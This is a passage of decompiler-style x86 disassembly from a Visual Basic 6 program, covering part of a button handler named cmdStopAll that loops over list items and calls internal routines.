007F9A0E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F9A13: add esp, 0000000Ch
007F9A16: lea ecx, var_38
007F9A19: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F9A1E: ret 
End Sub

Private sub cmdStopAll__7F7305
007F7305: push ebp
007F7306: mov ebp, esp
007F7308: sub esp, 00000018h
007F730B: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007F7310: mov eax, fs:[00h]
007F7316: push eax
007F7317: mov fs:[00000000h], esp
007F731E: mov eax, 000001A4h
007F7323: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F7328: push ebx
007F7329: push esi
007F732A: push edi
007F732B: mov var_18, esp
007F732E: mov var_14, 0040A000h
007F7335: mov eax, [ebp+08h]
007F7338: and eax, 00000001h
007F733B: mov var_10, eax
007F733E: mov eax, [ebp+08h]
007F7341: and al, FEh
007F7343: mov [ebp+08h], eax
007F7346: mov var_0C, 00000000h
007F734D: mov eax, [ebp+08h]
007F7350: mov eax, [eax]
007F7352: push [ebp+08h]
007F7355: call [eax+04h]
007F7358: mov var_04, 00000001h
007F735F: mov var_04, 00000002h
007F7366: push FFFFFFFFh
007F7368: call 00410A60h ; On Error ...
007F736D: mov var_04, 00000003h
007F7374: mov eax, [ebp+08h]
007F7377: mov eax, [eax]
007F7379: push [ebp+08h]
007F737C: call [eax+0000037Ch]
007F7382: push eax
007F7383: lea eax, var_3C
007F7386: push eax
007F7387: call 00410A84h ; Set (object)
007F738C: mov var_000000B8, eax
007F7392: lea eax, var_40
007F7395: push eax
007F7396: push 00000000h
007F7398: mov eax, var_000000B8
007F739E: mov eax, [eax]
007F73A0: push var_000000B8
007F73A6: call [eax+40h]
007F73A9: fclex 
007F73AB: mov var_000000BC, eax
007F73B1: cmp var_000000BC, 00000000h
007F73B8: jnl 7F73DAh
007F73BA: push 00000040h
007F73BC: push 00440DE8h
007F73C1: push var_000000B8
007F73C7: push var_000000BC
007F73CD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F73D2: mov var_00000168, eax
007F73D8: jmp 7F73E1h
007F73DA: and var_00000168, 00000000h
007F73E1: push 00000000h
007F73E3: push 00000000h
007F73E5: push var_40
007F73E8: lea eax, var_54
007F73EB: push eax
007F73EC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F73F1: add esp, 00000010h
007F73F4: push eax
007F73F5: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F73FA: sub ax, FFFFh
007F73FE: neg ax
007F7401: sbb eax, eax
007F7403: inc eax
007F7404: neg eax
007F7406: mov var_000000C0, ax
007F740D: lea eax, var_40
007F7410: push eax
007F7411: lea eax, var_3C
007F7414: push eax
007F7415: push 00000002h
007F7417: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F741C: add esp, 0000000Ch
007F741F: lea ecx, var_54
007F7422: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F7427: movsx eax, word ptr var_000000C0
007F742E: test eax, eax
007F7430: jz 007F7AACh
007F7436: mov var_04, 00000004h
007F743D: call 007A879Eh
007F7442: mov var_04, 00000005h
007F7449: mov var_80, 00000001h
007F7450: mov var_00000088, 00000002h
007F745A: cmp [008F2010h], 00000000h
007F7461: jnz 7F747Eh
007F7463: push 008F2010h
007F7468: push 00433984h
007F746D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7472: mov var_0000016C, 008F2010h
007F747C: jmp 7F7488h
007F747E: mov var_0000016C, 008F2010h
007F7488: push 00000000h
007F748A: push 00000001h
007F748C: push 00440E48h
007F7491: push 00000000h
007F7493: push 00000018h
007F7495: mov eax, var_0000016C
007F749B: mov eax, [eax]
007F749D: mov ecx, var_0000016C
007F74A3: mov ecx, [ecx]
007F74A5: mov ecx, [ecx]
007F74A7: push eax
007F74A8: call [ecx+00000550h]
007F74AE: push eax
007F74AF: lea eax, var_3C
007F74B2: push eax
007F74B3: call 00410A84h ; Set (object)
007F74B8: push eax
007F74B9: lea eax, var_54
007F74BC: push eax
007F74BD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F74C2: add esp, 00000010h
007F74C5: push eax
007F74C6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F74CB: push eax
007F74CC: lea eax, var_40
007F74CF: push eax
007F74D0: call 00410A84h ; Set (object)
007F74D5: push eax
007F74D6: lea eax, var_64
007F74D9: push eax
007F74DA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F74DF: add esp, 00000010h
007F74E2: push eax
007F74E3: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F74E8: mov var_00000090, eax
007F74EE: mov var_00000098, 00000003h
007F74F8: mov var_000000A0, 00000001h
007F7502: mov var_000000A8, 00000002h
007F750C: lea eax, var_00000088
007F7512: push eax
007F7513: lea eax, var_00000098
007F7519: push eax
007F751A: lea eax, var_000000A8
007F7520: push eax
007F7521: lea eax, var_000000E0
007F7527: push eax
007F7528: lea eax, var_000000D0
007F752E: push eax
007F752F: lea eax, var_30
007F7532: push eax
007F7533: call 00410A3Ch ; For
007F7538: mov var_00000158, eax
007F753E: lea eax, var_40
007F7541: push eax
007F7542: lea eax, var_3C
007F7545: push eax
007F7546: push 00000002h
007F7548: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F754D: add esp, 0000000Ch
007F7550: lea eax, var_64
007F7553: push eax
007F7554: lea eax, var_54
007F7557: push eax
007F7558: push 00000002h
007F755A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F755F: add esp, 0000000Ch
007F7562: jmp 007F78CFh
007F7567: mov var_04, 00000006h
007F756E: mov var_00000090, 00000003h
007F7578: mov var_00000098, 00000003h
007F7582: lea eax, var_30
007F7585: mov var_80, eax
007F7588: mov var_00000088, 0000400Ch
007F7592: cmp [008F2010h], 00000000h
007F7599: jnz 7F75B6h
007F759B: push 008F2010h
007F75A0: push 00433984h
007F75A5: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F75AA: mov var_00000170, 008F2010h
007F75B4: jmp 7F75C0h
007F75B6: mov var_00000170, 008F2010h
007F75C0: push 00000010h
007F75C2: pop eax
007F75C3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F75C8: lea esi, var_00000098
007F75CE: mov edi, esp
007F75D0: movsd 
007F75D1: movsd 
007F75D2: movsd 
007F75D3: movsd 
007F75D4: push 00000001h
007F75D6: push 00000010h
007F75D8: push 00440E58h
007F75DD: push 00000010h
007F75DF: pop eax
007F75E0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F75E5: lea esi, var_00000088
007F75EB: mov edi, esp
007F75ED: movsd 
007F75EE: movsd 
007F75EF: movsd 
007F75F0: movsd 
007F75F1: push 00000001h
007F75F3: push 00000000h
007F75F5: push 00440E48h
007F75FA: push 00000000h
007F75FC: push 00000018h
007F75FE: mov eax, var_00000170
007F7604: mov eax, [eax]
007F7606: mov ecx, var_00000170
007F760C: mov ecx, [ecx]
007F760E: mov ecx, [ecx]
007F7610: push eax
007F7611: call [ecx+00000550h]
007F7617: push eax
007F7618: lea eax, var_3C
007F761B: push eax
007F761C: call 00410A84h ; Set (object)
007F7621: push eax
007F7622: lea eax, var_54
007F7625: push eax
007F7626: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F762B: add esp, 00000010h
007F762E: push eax
007F762F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7634: push eax
007F7635: lea eax, var_40
007F7638: push eax
007F7639: call 00410A84h ; Set (object)
007F763E: push eax
007F763F: lea eax, var_64
007F7642: push eax
007F7643: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7648: add esp, 00000020h
007F764B: push eax
007F764C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7651: push eax
007F7652: lea eax, var_44
007F7655: push eax
007F7656: call 00410A84h ; Set (object)
007F765B: push eax
007F765C: lea eax, var_74
007F765F: push eax
007F7660: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7665: add esp, 00000020h
007F7668: push eax
007F7669: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F766E: mov edx, eax
007F7670: lea ecx, var_34
007F7673: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F7678: push eax
007F7679: push 00000000h
007F767B: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
007F7680: neg eax
007F7682: sbb eax, eax
007F7684: neg eax
007F7686: neg eax
007F7688: mov var_000000B8, ax
007F768F: lea ecx, var_34
007F7692: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F7697: lea eax, var_44
007F769A: push eax
007F769B: lea eax, var_40
007F769E: push eax
007F769F: lea eax, var_3C
007F76A2: push eax
007F76A3: push 00000003h
007F76A5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F76AA: add esp, 00000010h
007F76AD: lea eax, var_74
007F76B0: push eax
007F76B1: lea eax, var_64
007F76B4: push eax
007F76B5: lea eax, var_54
007F76B8: push eax
007F76B9: push 00000003h
007F76BB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F76C0: add esp, 00000010h
007F76C3: movsx eax, word ptr var_000000B8
007F76CA: test eax, eax
007F76CC: jz 007F78ABh
007F76D2: mov var_04, 00000007h
007F76D9: lea eax, var_30
007F76DC: mov var_80, eax
007F76DF: mov var_00000088, 0000400Ch
007F76E9: cmp [008F2010h], 00000000h
007F76F0: jnz 7F770Dh
007F76F2: push 008F2010h
007F76F7: push 00433984h
007F76FC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7701: mov var_00000174, 008F2010h
007F770B: jmp 7F7717h
007F770D: mov var_00000174, 008F2010h
007F7717: push 00000000h
007F7719: push 00000014h
007F771B: push 00440E58h
007F7720: push 00000010h
007F7722: pop eax
007F7723: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F7728: lea esi, var_00000088
007F772E: mov edi, esp
007F7730: movsd 
007F7731: movsd 
007F7732: movsd 
007F7733: movsd 
007F7734: push 00000001h
007F7736: push 00000000h
007F7738: push 00440E48h
007F773D: push 00000000h
007F773F: push 00000018h
007F7741: mov eax, var_00000174
007F7747: mov eax, [eax]
007F7749: mov ecx, var_00000174
007F774F: mov ecx, [ecx]
007F7751: mov ecx, [ecx]
007F7753: push eax
007F7754: call [ecx+00000550h]
007F775A: push eax
007F775B: lea eax, var_3C
007F775E: push eax
007F775F: call 00410A84h ; Set (object)
007F7764: push eax
007F7765: lea eax, var_54
007F7768: push eax
007F7769: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F776E: add esp, 00000010h
007F7771: push eax
007F7772: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7777: push eax
007F7778: lea eax, var_40
007F777B: push eax
007F777C: call 00410A84h ; Set (object)
007F7781: push eax
007F7782: lea eax, var_64
007F7785: push eax
007F7786: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F778B: add esp, 00000020h
007F778E: push eax
007F778F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7794: push eax
007F7795: lea eax, var_44
007F7798: push eax
007F7799: call 00410A84h ; Set (object)
007F779E: push eax
007F779F: lea eax, var_74
007F77A2: push eax
007F77A3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F77A8: add esp, 00000010h
007F77AB: push eax
007F77AC: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F77B1: mov edx, eax
007F77B3: lea ecx, var_34
007F77B6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F77BB: push eax
007F77BC: call 004109DCh ; Val(arg_1)
007F77C1: fstp real8 ptr var_000000B4
007F77C7: push 00000000h
007F77C9: push 00000001h
007F77CB: push 00000001h
007F77CD: push 00000000h
007F77CF: lea eax, var_78
007F77D2: push eax
007F77D3: push 00000010h
007F77D5: push 00000880h
007F77DA: call 00410946h ; ReDim
007F77DF: add esp, 0000001Ch
007F77E2: mov var_00000090, 00442930h
007F77EC: mov var_00000098, 00000008h
007F77F6: lea esi, var_00000098
007F77FC: push 00000000h
007F77FE: push var_78
007F7801: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F7806: mov ecx, eax
007F7808: mov edx, esi
007F780A: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F780F: mov var_000000A0, 00442BFCh
007F7819: mov var_000000A8, 00000008h
007F7823: lea esi, var_000000A8
007F7829: push 00000001h
007F782B: push var_78
007F782E: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F7833: mov ecx, eax
007F7835: mov edx, esi
007F7837: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F783C: mov edx, 0043D464h ; x7
007F7841: lea ecx, var_38
007F7844: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F7849: lea eax, var_78
007F784C: push eax
007F784D: lea eax, var_38
007F7850: push eax
007F7851: fld real8 ptr var_000000B4
007F7857: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F785C: push eax
007F785D: call 007A6910h
007F7862: lea eax, var_78
007F7865: push eax
007F7866: push 00000000h
007F7868: call 00410934h ; Erase
007F786D: lea eax, var_38
007F7870: push eax
007F7871: lea eax, var_34
007F7874: push eax
007F7875: push 00000002h
007F7877: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F787C: add esp, 0000000Ch
007F787F: lea eax, var_44
007F7882: push eax
007F7883: lea eax, var_40
007F7886: push eax
007F7887: lea eax, var_3C
007F788A: push eax
007F788B: push 00000003h
007F788D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7892: add esp, 00000010h
007F7895: lea eax, var_74
007F7898: push eax
007F7899: lea eax, var_64
007F789C: push eax
007F789D: lea eax, var_54
007F78A0: push eax
007F78A1: push 00000003h
007F78A3: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F78A8: add esp, 00000010h
007F78AB: mov var_04, 00000009h
007F78B2: lea eax, var_000000E0
007F78B8: push eax
007F78B9: lea eax, var_000000D0
007F78BF: push eax
007F78C0: lea eax, var_30
007F78C3: push eax
007F78C4: call 00410A36h ; Next
007F78C9: mov var_00000158, eax
007F78CF: cmp var_00000158, 00000000h
007F78D6: jnz 007F7567h
007F78DC: mov var_04, 0000000Bh
007F78E3: mov var_80, 00000001h
007F78EA: mov var_00000088, 00000002h
007F78F4: cmp [008F2410h], 00000000h
007F78FB: jnz 7F7918h
007F78FD: push 008F2410h
007F7902: push 00440E38h
007F7907: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F790C: mov var_00000178, 008F2410h
007F7916: jmp 7F7922h
007F7918: mov var_00000178, 008F2410h
007F7922: mov eax, var_00000178
007F7928: mov eax, [eax]
007F792A: mov var_000000B8, eax
007F7930: lea eax, var_000000AC
007F7936: push eax
007F7937: mov eax, var_000000B8
007F793D: mov eax, [eax]
007F793F: push var_000000B8
007F7945: call [eax+24h]
007F7948: fclex 
007F794A: mov var_000000BC, eax
007F7950: cmp var_000000BC, 00000000h
007F7957: jnl 7F7979h
007F7959: push 00000024h
007F795B: push 00440E28h
007F7960: push var_000000B8
007F7966: push var_000000BC
007F796C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F7971: mov var_0000017C, eax
007F7977: jmp 7F7980h
007F7979: and var_0000017C, 00000000h
007F7980: mov eax, var_000000AC
007F7986: mov var_00000090, eax
007F798C: mov var_00000098, 00000003h
007F7996: mov var_000000A0, 00000001h
007F79A0: mov var_000000A8, 00000002h
007F79AA: lea eax, var_00000088
007F79B0: push eax
007F79B1: lea eax, var_00000098
007F79B7: push eax
007F79B8: lea eax, var_000000A8
007F79BE: push eax
007F79BF: lea eax, var_00000100
007F79C5: push eax
007F79C6: lea eax, var_000000F0
007F79CC: push eax
007F79CD: lea eax, var_30
007F79D0: push eax
007F79D1: call 00410A3Ch ; For
007F79D6: mov var_0000015C, eax
007F79DC: jmp 007F7A9Ah
007F79E1: mov var_04, 0000000Ch
007F79E8: cmp [008F2410h], 00000000h
007F79EF: jnz 7F7A0Ch
007F79F1: push 008F2410h
007F79F6: push 00440E38h
007F79FB: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7A00: mov var_00000180, 008F2410h
007F7A0A: jmp 7F7A16h
007F7A0C: mov var_00000180, 008F2410h
007F7A16: mov eax, var_00000180
007F7A1C: mov eax, [eax]
007F7A1E: mov var_000000B8, eax
007F7A24: lea eax, var_30
007F7A27: push eax
007F7A28: mov eax, var_000000B8
007F7A2E: mov eax, [eax]
007F7A30: push var_000000B8
007F7A36: call [eax+28h]
007F7A39: fclex 
007F7A3B: mov var_000000BC, eax
007F7A41: cmp var_000000BC, 00000000h
007F7A48: jnl 7F7A6Ah
007F7A4A: push 00000028h
007F7A4C: push 00440E28h
007F7A51: push var_000000B8
007F7A57: push var_000000BC
007F7A5D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F7A62: mov var_00000184, eax
007F7A68: jmp 7F7A71h
007F7A6A: and var_00000184, 00000000h
007F7A71: jmp 007F78DCh
007F7A76: mov var_04, 0000000Eh
007F7A7D: lea eax, var_00000100
007F7A83: push eax
007F7A84: lea eax, var_000000F0
007F7A8A: push eax
007F7A8B: lea eax, var_30
007F7A8E: push eax
007F7A8F: call 00410A36h ; Next
007F7A94: mov var_0000015C, eax
007F7A9A: cmp var_0000015C, 00000000h
007F7AA1: jnz 007F79E1h
007F7AA7: jmp 007F861Bh
007F7AAC: mov var_04, 0000000Fh
007F7AB3: mov eax, [ebp+08h]
007F7AB6: mov eax, [eax]
007F7AB8: push [ebp+08h]
007F7ABB: call [eax+0000037Ch]
007F7AC1: push eax
007F7AC2: lea eax, var_3C
007F7AC5: push eax
007F7AC6: call 00410A84h ; Set (object)
007F7ACB: mov var_000000B8, eax
007F7AD1: lea eax, var_40
007F7AD4: push eax
007F7AD5: push 00000001h
007F7AD7: mov eax, var_000000B8
007F7ADD: mov eax, [eax]
007F7ADF: push var_000000B8
007F7AE5: call [eax+40h]
007F7AE8: fclex 
007F7AEA: mov var_000000BC, eax
007F7AF0: cmp var_000000BC, 00000000h
007F7AF7: jnl 7F7B19h
007F7AF9: push 00000040h
007F7AFB: push 00440DE8h
007F7B00: push var_000000B8
007F7B06: push var_000000BC
007F7B0C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F7B11: mov var_00000188, eax
007F7B17: jmp 7F7B20h
007F7B19: and var_00000188, 00000000h
007F7B20: push 00000000h
007F7B22: push 00000000h
007F7B24: push var_40
007F7B27: lea eax, var_54
007F7B2A: push eax
007F7B2B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7B30: add esp, 00000010h
007F7B33: push eax
007F7B34: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F7B39: sub ax, FFFFh
007F7B3D: neg ax
007F7B40: sbb eax, eax
007F7B42: inc eax
007F7B43: neg eax
007F7B45: mov var_000000C0, ax
007F7B4C: lea eax, var_40
007F7B4F: push eax
007F7B50: lea eax, var_3C
007F7B53: push eax
007F7B54: push 00000002h
007F7B56: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7B5B: add esp, 0000000Ch
007F7B5E: lea ecx, var_54
007F7B61: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F7B66: movsx eax, word ptr var_000000C0
007F7B6D: test eax, eax
007F7B6F: jz 007F8211h
007F7B75: mov var_04, 00000010h
007F7B7C: mov var_80, 00000001h
007F7B83: mov var_00000088, 00000002h
007F7B8D: cmp [008F2010h], 00000000h
007F7B94: jnz 7F7BB1h
007F7B96: push 008F2010h
007F7B9B: push 00433984h
007F7BA0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7BA5: mov var_0000018C, 008F2010h
007F7BAF: jmp 7F7BBBh
007F7BB1: mov var_0000018C, 008F2010h
007F7BBB: push 00000000h
007F7BBD: push 00000001h
007F7BBF: push 00440E48h
007F7BC4: push 00000000h
007F7BC6: push 00000018h
007F7BC8: mov eax, var_0000018C
007F7BCE: mov eax, [eax]
007F7BD0: mov ecx, var_0000018C
007F7BD6: mov ecx, [ecx]
007F7BD8: mov ecx, [ecx]
007F7BDA: push eax
007F7BDB: call [ecx+00000550h]
007F7BE1: push eax
007F7BE2: lea eax, var_3C
007F7BE5: push eax
007F7BE6: call 00410A84h ; Set (object)
007F7BEB: push eax
007F7BEC: lea eax, var_54
007F7BEF: push eax
007F7BF0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7BF5: add esp, 00000010h
007F7BF8: push eax
007F7BF9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7BFE: push eax
007F7BFF: lea eax, var_40
007F7C02: push eax
007F7C03: call 00410A84h ; Set (object)
007F7C08: push eax
007F7C09: lea eax, var_64
007F7C0C: push eax
007F7C0D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7C12: add esp, 00000010h
007F7C15: push eax
007F7C16: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F7C1B: mov var_00000090, eax
007F7C21: mov var_00000098, 00000003h
007F7C2B: mov var_000000A0, 00000001h
007F7C35: mov var_000000A8, 00000002h
007F7C3F: lea eax, var_00000088
007F7C45: push eax
007F7C46: lea eax, var_00000098
007F7C4C: push eax
007F7C4D: lea eax, var_000000A8
007F7C53: push eax
007F7C54: lea eax, var_00000120
007F7C5A: push eax
007F7C5B: lea eax, var_00000110
007F7C61: push eax
007F7C62: lea eax, var_30
007F7C65: push eax
007F7C66: call 00410A3Ch ; For
007F7C6B: mov var_00000160, eax
007F7C71: lea eax, var_40
007F7C74: push eax
007F7C75: lea eax, var_3C
007F7C78: push eax
007F7C79: push 00000002h
007F7C7B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7C80: add esp, 0000000Ch
007F7C83: lea eax, var_64
007F7C86: push eax
007F7C87: lea eax, var_54
007F7C8A: push eax
007F7C8B: push 00000002h
007F7C8D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F7C92: add esp, 0000000Ch
007F7C95: jmp 007F81FFh
007F7C9A: mov var_04, 00000011h
007F7CA1: lea eax, var_30
007F7CA4: mov var_80, eax
007F7CA7: mov var_00000088, 0000400Ch
007F7CB1: cmp [008F2010h], 00000000h
007F7CB8: jnz 7F7CD5h
007F7CBA: push 008F2010h
007F7CBF: push 00433984h
007F7CC4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7CC9: mov var_00000190, 008F2010h
007F7CD3: jmp 7F7CDFh
007F7CD5: mov var_00000190, 008F2010h
007F7CDF: push 00000000h
007F7CE1: push 00000004h
007F7CE3: push 00440E58h
007F7CE8: push 00000010h
007F7CEA: pop eax
007F7CEB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F7CF0: lea esi, var_00000088
007F7CF6: mov edi, esp
007F7CF8: movsd 
007F7CF9: movsd 
007F7CFA: movsd 
007F7CFB: movsd 
007F7CFC: push 00000001h
007F7CFE: push 00000000h
007F7D00: push 00440E48h
007F7D05: push 00000000h
007F7D07: push 00000018h
007F7D09: mov eax, var_00000190
007F7D0F: mov eax, [eax]
007F7D11: mov ecx, var_00000190
007F7D17: mov ecx, [ecx]
007F7D19: mov ecx, [ecx]
007F7D1B: push eax
007F7D1C: call [ecx+00000550h]
007F7D22: push eax
007F7D23: lea eax, var_3C
007F7D26: push eax
007F7D27: call 00410A84h ; Set (object)
007F7D2C: push eax
007F7D2D: lea eax, var_54
007F7D30: push eax
007F7D31: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7D36: add esp, 00000010h
007F7D39: push eax
007F7D3A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7D3F: push eax
007F7D40: lea eax, var_40
007F7D43: push eax
007F7D44: call 00410A84h ; Set (object)
007F7D49: push eax
007F7D4A: lea eax, var_64
007F7D4D: push eax
007F7D4E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7D53: add esp, 00000020h
007F7D56: push eax
007F7D57: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7D5C: push eax
007F7D5D: lea eax, var_44
007F7D60: push eax
007F7D61: call 00410A84h ; Set (object)
007F7D66: push eax
007F7D67: lea eax, var_74
007F7D6A: push eax
007F7D6B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7D70: add esp, 00000010h
007F7D73: push eax
007F7D74: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F7D79: sub ax, FFFFh
007F7D7D: neg ax
007F7D80: sbb eax, eax
007F7D82: inc eax
007F7D83: neg eax
007F7D85: mov var_000000B8, ax
007F7D8C: lea eax, var_44
007F7D8F: push eax
007F7D90: lea eax, var_40
007F7D93: push eax
007F7D94: lea eax, var_3C
007F7D97: push eax
007F7D98: push 00000003h
007F7D9A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F7D9F: add esp, 00000010h
007F7DA2: lea eax, var_74
007F7DA5: push eax
007F7DA6: lea eax, var_64
007F7DA9: push eax
007F7DAA: lea eax, var_54
007F7DAD: push eax
007F7DAE: push 00000003h
007F7DB0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F7DB5: add esp, 00000010h
007F7DB8: movsx eax, word ptr var_000000B8
007F7DBF: test eax, eax
007F7DC1: jz 007F81DBh
007F7DC7: mov var_04, 00000012h
007F7DCE: lea eax, var_30
007F7DD1: mov var_80, eax
007F7DD4: mov var_00000088, 0000400Ch
007F7DDE: cmp [008F2010h], 00000000h
007F7DE5: jnz 7F7E02h
007F7DE7: push 008F2010h
007F7DEC: push 00433984h
007F7DF1: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F7DF6: mov var_00000194, 008F2010h
007F7E00: jmp 7F7E0Ch
007F7E02: mov var_00000194, 008F2010h
007F7E0C: push 00000000h
007F7E0E: push 00000014h
007F7E10: push 00440E58h
007F7E15: push 00000010h
007F7E17: pop eax
007F7E18: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F7E1D: lea esi, var_00000088
007F7E23: mov edi, esp
007F7E25: movsd 
007F7E26: movsd 
007F7E27: movsd 
007F7E28: movsd 
007F7E29: push 00000001h
007F7E2B: push 00000000h
007F7E2D: push 00440E48h
007F7E32: push 00000000h
007F7E34: push 00000018h
007F7E36: mov eax, var_00000194
007F7E3C: mov eax, [eax]
007F7E3E: mov ecx, var_00000194
007F7E44: mov ecx, [ecx]
007F7E46: mov ecx, [ecx]
007F7E48: push eax
007F7E49: call [ecx+00000550h]
007F7E4F: push eax
007F7E50: lea eax, var_3C
007F7E53: push eax
007F7E54: call 00410A84h ; Set (object)
007F7E59: push eax
007F7E5A: lea eax, var_54
007F7E5D: push eax
007F7E5E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7E63: add esp, 00000010h
007F7E66: push eax
007F7E67: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7E6C: push eax
007F7E6D: lea eax, var_40
007F7E70: push eax
007F7E71: call 00410A84h ; Set (object)
007F7E76: push eax
007F7E77: lea eax, var_64
007F7E7A: push eax
007F7E7B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7E80: add esp, 00000020h
007F7E83: push eax
007F7E84: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F7E89: push eax
007F7E8A: lea eax, var_44
007F7E8D: push eax
007F7E8E: call 00410A84h ; Set (object)
007F7E93: push eax
007F7E94: lea eax, var_74
007F7E97: push eax
007F7E98: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F7E9D: add esp, 00000010h
007F7EA0: push eax
007F7EA1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F7EA6: mov edx, eax
007F7EA8: lea ecx, var_34
007F7EAB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F7EB0: push eax
007F7EB1: call 004109DCh ; Val(arg_1)
007F7EB6: fstp real8 ptr var_000000B4
007F7EBC: push 00000000h
007F7EBE: push 00000001h
007F7EC0: push 00000001h
007F7EC2: push 00000000h
007F7EC4: lea eax, var_78
007F7EC7: push eax
007F7EC8: push 00000010h
007F7ECA: push 00000880h
007F7ECF: call 00410946h ; ReDim
007F7ED4: add esp, 0000001Ch
007F7ED7: mov var_00000090, 00442930h
007F7EE1: mov var_00000098, 00000008h
007F7EEB: lea esi, var_00000098
007F7EF1: push 00000000h
007F7EF3: push var_78
007F7EF6: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F7EFB: mov ecx, eax
007F7EFD: mov edx, esi
007F7EFF: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F7F04: mov var_000000A0, 00442BFCh
007F7F0E: mov var_000000A8, 00000008h
007F7F18: lea esi, var_000000A8
007F7F1E: push 00000001h
007F7F20: push var_78
007F7F23: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F7F28: mov ecx, eax
007F7F2A: mov edx, esi
007F7F2C: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F7F31: mov edx, 0043D464h ; x7
007F7F36: lea ecx, var_38
007F7F39: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F7F3E: lea eax, var_78
007F7F41: push eax
007F7F42: lea eax, var_38
007F7F45: push eax
007F7F46: fld real8 ptr var_000000B4
007F7F4C: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F7F51: push eax
007F7F52: call 007A6910h
007F7F57: lea eax, var_78
007F7F5A: push eax
007F7F5B: push 00000000h
007F7F5D: call 00410934h ; Erase
007F7F62: lea eax, var_38
007F7F65: push eax
007F7F66: lea eax, var_34
007F7F69: push eax
007F7F6A: push 00000002h
